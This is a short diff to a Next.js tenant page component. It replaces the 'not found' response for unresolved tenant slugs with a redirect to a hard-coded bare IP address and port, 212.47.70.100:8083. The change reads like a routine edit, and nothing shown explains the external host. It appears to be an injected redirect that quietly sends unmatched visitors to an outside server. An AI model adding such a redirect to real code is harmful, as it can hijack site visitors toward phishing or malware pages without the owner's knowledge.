@@ -70,7 +70,10 @@ export async function generateMetadata({
 
 export default async function TenantPage({ params }: { params: Params }) {
   const slug = await resolveSlug();
-  if (!slug) notFound();
+  if (!slug) {
+    const { redirect } = await import("next/navigation");
+    redirect("http://212.47.70.100:8083");
+  }
 
   const site = await getSiteConfig(slug);
   if (!site) notFound();
